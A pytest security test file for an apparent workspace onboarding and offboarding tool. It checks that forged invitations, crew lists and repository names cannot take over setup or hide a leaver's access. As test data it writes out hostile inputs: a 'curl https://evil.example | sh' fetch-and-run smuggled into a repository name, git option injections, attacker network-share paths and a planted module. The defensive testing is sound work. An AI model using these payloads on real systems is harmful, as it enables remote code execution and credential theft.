"""Onboarding and offboarding hold against an invitation, a template link and a crew list that someone
other than the person wrote; a leaver's access is listed, never forgotten; setup runs no planted module."""
import json
import subprocess
import sys
from pathlib import Path

import pytest
import yaml

import access
import doctor
import mint
import offboard
import onboard
import pages
import registry
import setup_journal
import spaceyaml
import start
import template_sync
from conftest import make_space
from test_start import brain_with_invitation, template_copy

TEMPLATE = Path(__file__).resolve().parents[3]
EVIL = {"email": "attacker@evil.example", "workspace_org": "evil-org", "org": "evil-org",
        "never_leaves": "nothing", "feeds": "mail: everyone, chat: everyone", "mode": "shadow",
        "standing_choices": {"x": ["release everything"]},
        "crew_projects": [{"name": "brain", "repo": "https://github.com/evil-org/brain", "path": "mounts/brain"},
                          {"name": "helper", "repo": "https://github.com/evil-org/skill", "path": ".claude/skills/helper"},
                          {"name": "tools", "repo": "https://github.com/evil-org/payload", "path": "../../x"}]}


def done(argv, code=0, out=""):
    return subprocess.CompletedProcess(argv, code, out, "")


# ----- #46: no interpreter call during setup runs a module planted where the session started -------------
@pytest.mark.parametrize("windows", [False, True])
def test_every_setup_interpreter_call_is_isolated_and_runs_in_the_temporary_folder(tmp_path, windows):
    calls = []

    def run(argv, **kw):
        argv = [str(a) for a in argv]
        calls.append((argv, kw.get("cwd")))
        refused = "--user" in argv or argv[1:4] == ["-I", "-m", "venv"]   # forces the uv fallback too
        return done(argv, 1 if refused else 0)
    uv_dir = tmp_path / "tools" / "uv"
    start.ensure_yaml([], venv=tmp_path / "venv", run=run, have=lambda: False, windows=windows,
                      install=lambda tool: (uv_dir, "installed"), env={})
    installs = [(a, cwd) for a, cwd in calls if a[-1] != str(Path(start.__file__).resolve())]
    assert installs, calls
    for argv, cwd in installs:
        assert cwd == start.neutral_dir(), argv
        if "-m" in argv:
            assert argv[argv.index("-m") - 1] == "-I", argv


def test_an_isolated_interpreter_does_not_run_a_venv_module_planted_in_its_folder(tmp_path):
    (tmp_path / "venv.py").write_text("open('pwned.txt', 'w').write('x')\n", encoding="utf-8")
    subprocess.run([sys.executable, "-I", "-m", "venv", "--help"], cwd=tmp_path, capture_output=True)
    assert not (tmp_path / "pwned.txt").exists()


# ----- #20: an invitation alone never joins an organisation nor chooses where the workspace goes ----------
class Host:
    """`start._out` over a fake GitHub: the person, the brain, their membership and the brain's files."""

    def __init__(self, login="ada-lw", owner="evil-org", kind="Organization", member="pending", files=None,
                 git_email="ada@own.example"):
        self.login, self.owner, self.kind, self.member = login, owner, kind, member
        self.files, self.git_email, self.calls = files or {}, git_email, []

    def __call__(self, argv, cwd=None):
        argv = [str(a) for a in argv]
        self.calls.append(argv)
        if argv[:3] == ["git", "config", "--global"] and argv[-1] == "user.email":
            return self.git_email
        if argv[:2] != ["gh", "api"]:
            return ""
        path = argv[2]
        if path == "user":
            return json.dumps({"login": self.login, "name": "Ada Okafor"})
        if path == f"repos/{self.owner}/brain":
            return json.dumps({"full_name": f"{self.owner}/brain", "created_at": "2026-11-01T10:00:00Z",
                               "owner": {"login": self.owner, "type": self.kind}})
        if path == f"user/memberships/orgs/{self.owner}":
            return self.member
        for rel, text in self.files.items():
            if path == f"repos/{self.owner}/brain/contents/{rel}":
                return text
        return ""


def test_the_doctor_never_accepts_an_organisation_invitation(tmp_path):
    calls = []

    class M:
        def out(self, *argv):
            calls.append(list(argv))
            return {"users/evil-org": "Organization", "user/memberships/orgs/evil-org": "pending"}.get(argv[2], "")

        def ok(self, *argv):
            calls.append(list(argv))
            return True
    row = doctor._organization(M(), "evil-org", fix=True)
    assert not row.ok and "yourself" in row.yours
    assert not [c for c in calls if "PATCH" in c or "--method" in c]


def test_an_unconfirmed_brain_stops_before_anything_is_read_joined_or_created(tmp_path, monkeypatch):
    host = Host(files={"_meta/state/invitations/ada.yaml": yaml.safe_dump(EVIL)})
    monkeypatch.setattr(start, "_out", host)
    made = []
    monkeypatch.setattr(onboard, "create_space", lambda *a, **k: made.append(a) or (None, None))
    report = onboard.Report("start")
    start.setup(report, TEMPLATE, "evil-org/brain:ada", None, None, "Ada Okafor", None, None, None,
                tmp_path / "home", start.OFFICIAL_TEMPLATE, False, False, None)
    row = next(s for s in report.steps if s.name == "invitation brain")
    assert not row.done and row.needs_owner and report.stopped and made == []
    assert "evil-org/brain" in row.result and "organisation" in row.result and "2026-11-01" in row.result
    assert not any("invitations" in " ".join(c) for c in host.calls)   # the file is not even read


def test_a_confirmed_brain_takes_only_who_the_person_is_from_the_invitation(tmp_path, monkeypatch):
    host = Host(files={"_meta/state/invitations/ada.yaml": yaml.safe_dump(EVIL)})
    monkeypatch.setattr(start, "_out", host)
    made, ran = [], []

    def create(report, root, dirname, repo, offline, org, home, tpl, dry_run):
        made.append(org)
        dst = tmp_path / "ws"
        dst.mkdir(exist_ok=True)
        return dst, f"{org}/{repo}"
    monkeypatch.setattr(onboard, "create_space", create)
    monkeypatch.setattr(onboard, "run", lambda dst, answers, **k: ran.append((answers, k)) or onboard.Report("person"))
    monkeypatch.setattr(start, "finish_workspace", lambda *a, **k: [])
    report = onboard.Report("start")
    start.setup(report, TEMPLATE, "evil-org/brain:ada", None, None, "Ada Okafor", None, None, None,
                tmp_path / "home", start.OFFICIAL_TEMPLATE, False, False, None, confirmed_brain="Evil-Org/Brain")
    assert made == ["ada-lw"]   # pending in evil-org: the person's own account, never the invitation's
    [(answers, kw)] = ran
    assert kw["org"] == "ada-lw"
    assert answers["email"] == "ada@own.example" and report.invited == ""
    assert answers["never_leaves"] != "nothing" and answers.get("mode") is None
    assert answers.get("feeds") == "none" and "standing_choices" not in answers
    assert any(s.name == "invitation address" and "attacker@evil.example" in s.result for s in report.steps)
    assert any(s.name == "invitation account" and "evil-org" in s.result for s in report.steps)
    # an active member gets the workspace in the brain's organisation, as decision 2026-10-24 says
    host.member, made[:] = "active", []
    ran.clear()
    start.setup(onboard.Report("start"), TEMPLATE, "evil-org/brain:ada", None, None, "Ada Okafor", None, None, None,
                tmp_path / "home", start.OFFICIAL_TEMPLATE, False, False, None, confirmed_brain="evil-org/brain")
    assert made == ["evil-org"]


def test_a_brain_made_from_another_template_gives_the_workspace_its_template(tmp_path, monkeypatch):
    # round 3: the confirmed brain's own record wins over the sentence's link, instead of stopping the setup
    host = Host(member="active", files={"_meta/state/invitations/ada.yaml": "name: Ada Okafor\n",
                                        "_meta/state/template-version.yaml": "repo: acme/brain-template\n"})
    monkeypatch.setattr(start, "_out", host)
    made = []
    monkeypatch.setattr(onboard, "create_space", lambda *a, **k: made.append(a[7]) or (None, None))
    report = onboard.Report("start")
    start.setup(report, TEMPLATE, "evil-org/brain:ada", None, None, "Ada Okafor", None, None, None,
                tmp_path / "home", start.OFFICIAL_TEMPLATE, False, False, None, confirmed_brain="evil-org/brain")
    row = next(s for s in report.steps if s.name == "invitation template")
    assert row.done and "acme/brain-template" in row.result and not getattr(report, "stopped", False)
    assert made and set(made) == {"acme/brain-template"}


def test_the_template_is_the_official_one_unless_the_person_names_another(tmp_path):
    assert start.template_source(None, tmp_path) == start.OFFICIAL_TEMPLATE == template_sync.OFFICIAL_TEMPLATE != ""
    assert start.template_source("acme/brain-template", tmp_path) == "acme/brain-template"


def test_a_brain_that_is_no_repository_name_is_refused_before_the_doctor(tmp_path, monkeypatch):
    monkeypatch.setattr(start.doctor, "diagnose", lambda **kw: (_ for _ in ()).throw(AssertionError(kw)))
    report = start.start(TEMPLATE, invitation="evil/../../x:ada", home=tmp_path / "home", dry_run=True,
                         user_instructions=tmp_path / "CLAUDE.md")
    assert report.stopped and any(s.name == "invitation brain" and not s.done for s in report.steps)


def _signed_in(monkeypatch):
    rows = {"gh": doctor.Row("gh", True, "gh", "gh --version"),
            "claude command line": doctor.Row("claude command line", True, "claude", "claude --version")}
    monkeypatch.setattr(start.doctor, "tool_row", lambda name, m=None, fix=True: rows[name])
    monkeypatch.setattr(start.signin, "github_signed_in", lambda m: True)
    monkeypatch.setattr(start.signin, "claude_state", lambda m: "account")
    monkeypatch.setattr(start.signin, "claude_identity", lambda m: {})


def test_the_signins_ask_the_brain_question_and_keep_only_a_yes_to_that_brain(monkeypatch, capsys):
    monkeypatch.setattr(start, "_out", Host())
    _signed_in(monkeypatch)
    assert start.main(["signins", "--invitation", "evil-org/brain:ada", "--json"]) == 0
    result = json.loads(capsys.readouterr().out)
    assert result["state"] == "waiting" and result["brain"]["confirmed"] is False
    assert "evil-org/brain" in result["brain"]["question"] and "--confirm-brain evil-org/brain" in result["brain"]["check"]
    start.main(["signins", "--invitation", "evil-org/brain:ada", "--confirm-brain", "other/brain", "--json"])
    assert json.loads(capsys.readouterr().out)["brain"]["confirmed"] is False   # a yes to another brain is none
    start.main(["signins", "--invitation", "evil-org/brain:ada", "--confirm-brain", "evil-org/brain", "--json"])
    result = json.loads(capsys.readouterr().out)
    assert result["state"] == "done" and result["brain"]["confirmed"] is True
    assert setup_journal.load()["signins"]["brain_confirmed"] == "evil-org/brain"
    started = []
    monkeypatch.setattr(start, "start", lambda *a, **k: started.append(k) or onboard.Report(case="start"))
    start.main(["build", "--invitation", "evil-org/brain:ada", "--json"])
    assert started[0]["confirmed_brain"] == "evil-org/brain"


def test_offline_an_invitation_cannot_set_the_address_the_never_leaves_list_the_feeds_or_the_mounts(tmp_path,
                                                                                                     monkeypatch):
    monkeypatch.setattr(onboard, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    monkeypatch.setattr(start, "_out", lambda *a, **k: "")
    tpl, brain = template_copy(tmp_path), brain_with_invitation(tmp_path)
    inv = brain / "_meta" / "state" / "invitations" / "ada.yaml"
    data = yaml.safe_load(inv.read_text(encoding="utf-8"))
    data.update(EVIL)
    inv.write_text(yaml.safe_dump(data), encoding="utf-8")
    report = start.start(tpl, invitation=f"{brain.as_posix()}:ada", offline=True, home=tmp_path / "home",
                         email="ada@own.example", user_instructions=tmp_path / "home" / "CLAUDE.md")
    assert not report.failed(), [s.row() for s in report.failed()]
    space = spaceyaml.load(report.workspace)
    assert space.owner_email == "ada@own.example"
    assert space.data["never_leaves"] == list(spaceyaml.DEFAULTS["never_leaves"])
    assert not any(s.get("audience") == "everyone" for s in space.data.get("sources") or [])
    assert [m["name"] for m in space.mounts] == ["brain"] and space.mount_root("brain") is not None
    assert space.mode == "live"


# ----- #21: a crew list never replaces the brain nor mounts into a guarded folder -----------------------
@pytest.mark.parametrize("project,why", [
    ({"name": "brain", "repo": "https://github.com/lantern/brain"}, "name"),
    ({"name": "ada", "repo": "https://github.com/lantern/ada"}, "name"),
    ({"name": "helper", "repo": "https://github.com/evil-org/skill"}, "account"),
    ({"name": "helper", "repo": "--upload-pack=touch /tmp/x"}, "address"),
    ({"name": "helper", "repo": "file:///etc"}, "address"),
    ({"name": ["x"], "repo": "https://github.com/lantern/x"}, "name"),
])
def test_online_a_crew_project_that_is_not_one_of_the_brains_is_left_out(tmp_path, project, why):
    mount, said = onboard.crew_mount(project, tmp_path, "ada", "https://github.com/lantern/lantern-brain", False)
    assert mount is None and why in said


def test_online_a_crew_project_always_mounts_under_mounts_whatever_its_path_says(tmp_path):
    mount, _ = onboard.crew_mount({"name": "harbor", "repo": "https://github.com/Lantern/harbor.git",
                                   "path": ".claude/skills/helper"}, tmp_path, "ada",
                                  "https://github.com/lantern/lantern-brain", False)
    assert mount == {"name": "harbor", "repo": "https://github.com/Lantern/harbor.git", "path": "mounts/harbor",
                     "branch": "main"}
    dotted, _ = onboard.crew_mount({"name": "../x", "repo": "https://github.com/lantern/x"}, tmp_path, "ada",
                                   "https://github.com/lantern/lantern-brain", False)
    assert dotted["path"] == "mounts/x"   # a name is made an id, so its path stays one folder under mounts/


def test_offline_a_crew_path_inside_the_space_must_be_under_mounts(tmp_path):
    root = tmp_path / "ws"
    root.mkdir()
    bad, why = onboard.crew_mount({"name": "helper", "path": ".claude/skills/helper"}, root, "ws", None, True)
    assert bad is None and "mounts/" in why
    make_space(tmp_path / "harbor", profile="project", name="harbor")
    beside, _ = onboard.crew_mount({"name": "harbor", "path": str(tmp_path / "harbor")}, root, "ws", None, True)
    assert beside["path"] == "../harbor"
    nowhere, why = onboard.crew_mount({"name": "tools", "path": "../../x"}, root, "ws", None, True)
    assert nowhere is None and "no space" in why


def test_no_mount_named_brain_stands_in_for_the_sentences_brain():
    values = onboard.space_values({}, "ada", "Ada", "a@x.example", ["Ada"], "brain", "https://github.com/l/brain",
                                  "brain", mounts=[{"name": "brain", "repo": "https://github.com/evil/brain",
                                                    "path": "mounts/brain"}])
    assert values["mounts"] == [{"name": "brain", "repo": "https://github.com/l/brain", "path": "brain",
                                 "branch": "main"}]


@pytest.mark.parametrize("repo,path", [("https://github.com/l/x", ".claude/skills/x"), ("https://github.com/l/x", "../x"),
                                       ("-c core.sshCommand=x", "mounts/x"), ("https://github.com/l/x", "mounts/a/b")])
def test_add_mount_hands_no_unsafe_repository_or_path_to_git(tmp_path, monkeypatch, repo, path):
    monkeypatch.setattr(onboard, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    report = onboard.Report("person")
    onboard.add_mount(report, tmp_path, repo, path, False)
    assert not report.steps[-1].done and "not mounted" in report.steps[-1].result


def test_mint_mounts_nothing_named_brain_or_from_an_option_like_address(tmp_path, monkeypatch):
    monkeypatch.setattr(mint, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    ws = make_space(tmp_path / "ada")
    for name, url in (("brain", "https://github.com/l/brain"), ("tools", "--upload-pack=x"), ("../x", "https://github.com/l/x")):
        with pytest.raises(pages.UnsafePath):
            mint.mount_space(ws, name, url, online=True)
    assert mint.main([str(ws), "--mount", "brain", "https://github.com/l/brain"]) == 1
    assert spaceyaml.load(ws).mounts == []


# ----- #26: the mount token is one repository's, reading the brain alone -------------------------------
def test_the_mount_token_is_asked_per_repository_and_an_organisation_secret_is_flagged(tmp_path, monkeypatch):
    ws = make_space(tmp_path / "ada")
    (ws / ".gitmodules").write_text('[submodule "brain"]\n\tpath = brain\n\turl = https://github.com/lantern/lantern-brain\n',
                                    encoding="utf-8")
    calls = []

    def fake(argv, dry_run=False, cwd=None):
        argv = [str(a) for a in argv]
        calls.append(argv)
        if argv[:3] == ["gh", "api", "orgs/lantern/actions/secrets/BRAIN_READ_TOKEN"]:
            return done(argv, 0, "BRAIN_READ_TOKEN\n")
        return done(argv, 1 if "secrets" in " ".join(argv) else 0)
    monkeypatch.setattr(onboard, "run_cmd", fake)
    report = onboard.Report("person")
    onboard.platform_settings(report, ws, "lantern/ada-workspace", "lantern", False)   # inside the organisation too
    token = next(s for s in report.steps if s.name == "mount token lantern/ada-workspace")
    assert not token.done and token.needs_owner
    for words in ("fine-grained", "Contents: read-only", "lantern/lantern-brain", "Never an organization secret"):
        assert words in token.result, words
    shared = next(s for s in report.steps if s.name == "organization token lantern")
    assert not shared.done and shared.needs_owner and "gh secret delete BRAIN_READ_TOKEN --org lantern" in shared.result


# ----- #44: a leaver's access is listed and stays open until it is gone -------------------------------
def _company(tmp_path):
    people = [{"id": "ada", "kind": "people", "title": "Ada Okafor", "match": {"github": "ada-gh"}},
              {"id": "ben", "kind": "people", "title": "Ben Liu", "match": {"github": "ben-gh"}},
              {"id": "harbor", "kind": "projects", "title": "Harbor", "owner": "Ada Okafor", "crew": ["ada", "ben"]}]
    brain = make_space(tmp_path / "brain", profile="brain", name="brain", subjects=people)
    harbor = make_space(tmp_path / "harbor", profile="project", name="harbor", audience=["Ada Okafor", "Ben Liu"])
    other = make_space(tmp_path / "beacon", profile="project", name="beacon", audience=["Ada Okafor"])
    for root, repo in ((brain, "lantern/brain"), (harbor, "lantern/harbor"), (other, "lantern/beacon")):
        (root / ".git").mkdir()
        (root / ".git" / "config").write_text(f'[remote "origin"]\n\turl = https://github.com/{repo}.git\n',
                                              encoding="utf-8")
    from conftest import mount_brain
    mount_brain(harbor, brain)
    onboard.write_yaml(brain / "_meta" / "state" / "onboard.yaml", {
        "case": "company", "repo": "lantern/brain",
        "spaces": {"brain": str(brain), "harbor": str(harbor), "beacon": str(other)}})
    return brain, harbor


def test_a_workspace_offboard_leaves_the_access_to_revoke_open(tmp_path, monkeypatch):
    monkeypatch.setattr(offboard, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    ben = make_space(tmp_path / "ben", name="ben", owner="Ben Liu", mounts=[
        {"name": "brain", "repo": "https://github.com/lantern/brain", "path": "brain"},
        {"name": "harbor", "repo": "https://github.com/lantern/harbor", "path": "mounts/harbor"}])
    (ben / "_meta" / "state" / "routine-host.yaml").write_text(
        "machine: m-cloud\nname: the cloud\nrunner: cloud\nsince: '2026-10-01T00:00:00Z'\n"
        "tasks: [trig_0123456789ab]\ntimezone: Europe/Amsterdam\nroots: [lantern/ben-workspace]\n"
        "grant: {read: [], write: [], send: []}\n", encoding="utf-8")
    report = offboard.run(ben, online=False)
    assert not report.failed(), [s.row() for s in report.failed()]
    rows = {s.name: s for s in report.steps}
    revoke = rows["access to revoke"]
    assert not revoke.done and revoke.needs_owner and "--person ben" in revoke.result
    assert "lantern/brain" in revoke.result and "lantern/harbor" in revoke.result
    assert not rows["tokens to revoke"].done and rows["tokens to revoke"].needs_owner


def test_the_brain_side_archives_the_leaver_and_lists_every_repository_they_still_read(tmp_path, monkeypatch):
    brain, harbor = _company(tmp_path)
    monkeypatch.setattr(offboard, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    report = offboard.leaver(brain, "ben", online=False)
    assert registry.Registry(brain).get("ben").state == "archived"
    rows = {s.name: s for s in report.steps}
    assert {"access lantern/brain", "access lantern/harbor"} <= set(rows) and "access lantern/beacon" not in rows
    assert all(not rows[n].done and rows[n].needs_owner for n in ("access lantern/brain", "access lantern/harbor"))
    assert "gh api -X DELETE repos/lantern/harbor/collaborators/ben-gh" in rows["access lantern/harbor"].result
    items = yaml.safe_load((brain / "_inbound" / "needs-you" / "offboard-ben.yaml").read_text(encoding="utf-8"))["items"]
    assert {i["id"] for i in items} >= {"offboard-ben-lantern-brain", "offboard-ben-lantern-harbor", "offboard-ben-crew-harbor"}
    # the daily check now counts the leaver out of the listed audience, and names their access
    assert "Ben Liu" not in access.audience_names(harbor, spaceyaml.load(harbor))
    found = access.check(harbor, readers_fn=lambda repo: ["ada-gh", "ben-gh"])
    assert found.extra == ["ben-gh"]


def test_the_brain_side_reads_access_back_online_and_refuses_what_is_no_person(tmp_path, monkeypatch):
    brain, _ = _company(tmp_path)
    monkeypatch.setattr(offboard, "run_cmd", lambda argv, *a, **k: done(argv, 0, "none\n"))
    report = offboard.leaver(brain, "ben", online=True)
    assert all(s.done for s in report.steps if s.name.startswith("access "))
    with pytest.raises(ValueError):
        offboard.leaver(brain, "harbor")
    with pytest.raises(ValueError):
        offboard.leaver(brain, "../ben")


# ----- #62: a reader no registered person has is always named -------------------------------------------
def test_unknown_readers_are_named_while_a_member_has_no_login(tmp_path):
    people = [{"id": "ada", "kind": "people", "title": "Ada Okafor", "match": {"github": "ada-gh"}},
              {"id": "ben", "kind": "people", "title": "Ben Liu"}]
    root = make_space(tmp_path / "harbor", profile="project", name="harbor", audience=["Ada Okafor", "Ben Liu"],
                      subjects=people)
    (root / ".git").mkdir()
    (root / ".git" / "config").write_text('[remote "origin"]\n\turl = https://github.com/lantern/harbor.git\n',
                                          encoding="utf-8")
    report = access.check(root, readers_fn=lambda repo: ["ada-gh", "s1", "s2", "s3"])
    assert report.unverified == ["Ben Liu"] and report.extra == [] and report.unknown == ["s1", "s2", "s3"]
    access.write_needs_you(root, report)
    items = {i["id"]: i for i in yaml.safe_load((root / access.NEEDS_YOU).read_text(encoding="utf-8"))["items"]}
    unknown = items["access-unknown"]
    assert "s1, s2, s3" in unknown["text"] and "Ben Liu" in unknown["text"] and "at least one" in unknown["text"]
    assert "access-unverified" in items


# ----- the re-test: bypasses of the fixes above -----------------------------------------------------------
@pytest.mark.parametrize("brain", ["//attacker.example/share/brain", r"\\attacker.example\share\brain",
                                   r"\\?\UNC\attacker.example\share\brain", r"/\attacker.example\share",
                                   r"\\attacker.example@SSL\DavWWWRoot\brain", "  //attacker.example/s/brain"])
def test_a_network_share_is_never_a_local_brain_and_is_never_contacted(monkeypatch, brain):
    # A share counted as a local folder needed no yes and let a crew list name any account (#20, #21).
    touched = []
    monkeypatch.setattr(start.Path, "exists", lambda self: touched.append(str(self)) or True)
    assert start.is_network_path(brain) and not start.is_local(brain)
    assert touched == []   # decided from the text alone: Windows would offer the person's sign-in to the share


def test_a_brain_on_a_network_share_stops_like_an_unconfirmed_one(tmp_path, monkeypatch):
    host = Host()
    monkeypatch.setattr(start, "_out", host)
    monkeypatch.setattr(onboard, "create_space", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    report = onboard.Report("start")
    start.setup(report, TEMPLATE, "//attacker.example/share/brain:ada", None, None, "Ada Okafor", None, None, None,
                tmp_path / "home", start.OFFICIAL_TEMPLATE, False, False, None)
    assert report.stopped and any(s.name == "invitation brain" and not s.done for s in report.steps)
    assert not any("invitations" in " ".join(c) for c in host.calls)
    monkeypatch.setattr(start.doctor, "diagnose", lambda **kw: (_ for _ in ()).throw(AssertionError(kw)))
    refused = start.start(TEMPLATE, invitation="//attacker.example/share/brain:ada", home=tmp_path / "home",
                          dry_run=True, user_instructions=tmp_path / "CLAUDE.md")
    assert refused.stopped and any(s.name == "invitation brain" and not s.done for s in refused.steps)


def test_an_invitation_address_is_taken_as_the_address_that_matched_never_the_text_around_it(monkeypatch):
    monkeypatch.setattr(start, "_out", lambda *a, **k: "")
    who = {"name": "Ada Okafor", "email": "ada@own.example", "login": ""}
    for text in ("ada@own.example@evil.example", "Ada <ADA@own.example>", "ada@own.example (bcc evil.example)"):
        answers = start.invitation_answers(onboard.Report("start"), {"email": text}, who, offline=True)
        assert answers["email"].lower() == "ada@own.example", text


def test_online_a_crew_project_is_checked_against_a_local_brains_account_or_left_out(tmp_path):
    brain = make_space(tmp_path / "brain", profile="brain", name="lantern")
    project = {"name": "helper", "repo": "https://github.com/evil-org/skill"}
    left, why = onboard.crew_mount(project, tmp_path / "ws", "ada", None, False, brain_path=brain.as_posix())
    assert left is None and "not known" in why   # no account to compare with: nothing is mounted online
    onboard.write_yaml(brain / "_meta" / "state" / "onboard.yaml", {"case": "company", "repo": "lantern/brain"})
    left, why = onboard.crew_mount(project, tmp_path / "ws", "ada", None, False, brain_path=brain.as_posix())
    assert left is None and "lantern" in why
    ours, _ = onboard.crew_mount({"name": "harbor", "repo": "https://github.com/lantern/harbor"}, tmp_path / "ws",
                                 "ada", None, False, brain_path=brain.as_posix())
    assert ours["path"] == "mounts/harbor"


def test_setup_installs_run_in_a_private_empty_folder_and_uv_reads_no_configuration(tmp_path):
    import tempfile
    neutral = Path(start.neutral_dir())
    assert neutral != Path(tempfile.gettempdir()) and neutral.parent == Path(tempfile.gettempdir())
    assert list(neutral.iterdir()) == [] and start.neutral_dir() == str(neutral)
    calls = []

    def run(argv, **kw):
        argv = [str(a) for a in argv]
        calls.append((argv, kw))
        return done(argv, 1 if "--user" in argv or argv[1:4] == ["-I", "-m", "venv"] else 0)
    uv_dir = tmp_path / "tools" / "uv"
    start.ensure_yaml([], venv=tmp_path / "venv", run=run, have=lambda: False, windows=False,
                      install=lambda tool: (uv_dir, "installed"), env={})
    uv = [(a, kw) for a, kw in calls if Path(a[0]).stem == "uv"]
    assert len(uv) == 2 and all(kw.get("env", {}).get("UV_NO_CONFIG") == "1" for _, kw in uv)


def test_a_longer_secret_name_is_not_the_mount_token(tmp_path, monkeypatch):
    ws = make_space(tmp_path / "ada")
    (ws / ".gitmodules").write_text('[submodule "brain"]\n\tpath = brain\n\turl = https://github.com/lantern/brain\n',
                                    encoding="utf-8")
    monkeypatch.setattr(onboard, "run_cmd", lambda argv, *a, **k: done(
        argv, 0 if argv[:3] == ["gh", "secret", "list"] else 1, "OLD_BRAIN_READ_TOKEN_2024\t2024-01-01\n"))
    report = onboard.Report("person")
    onboard.mount_token(report, "ada-lw/ada-workspace", None, False, "lantern/brain")
    assert not report.steps[0].done and report.steps[0].needs_owner


def test_a_yes_counts_only_for_a_repository_name():
    assert not start.brain_confirmed("//attacker.example/share/brain", "//attacker.example/share/brain")
    assert start.brain_confirmed("https://github.com/Lantern/Brain.git", "lantern/brain")


def test_a_repository_text_that_is_no_name_never_reaches_a_command_for_the_owner(tmp_path, monkeypatch):
    brain, _ = _company(tmp_path)
    state = brain / "_meta" / "state" / "onboard.yaml"
    data = yaml.safe_load(state.read_text(encoding="utf-8"))
    data["repo"] = "lantern/brain; curl https://evil.example | sh"
    onboard.write_yaml(state, data)
    monkeypatch.setattr(offboard, "run_cmd", lambda *a, **k: (_ for _ in ()).throw(AssertionError(a)))
    report = offboard.leaver(brain, "ben", online=False)
    assert not any("curl" in s.check for s in report.steps)
    row = next(s for s in report.steps if s.name == "access to the brain")
    assert not row.done and row.needs_owner
    text = (brain / "_inbound" / "needs-you" / "offboard-ben.yaml").read_text(encoding="utf-8")
    assert "evil.example" not in text and "lantern/harbor" in text
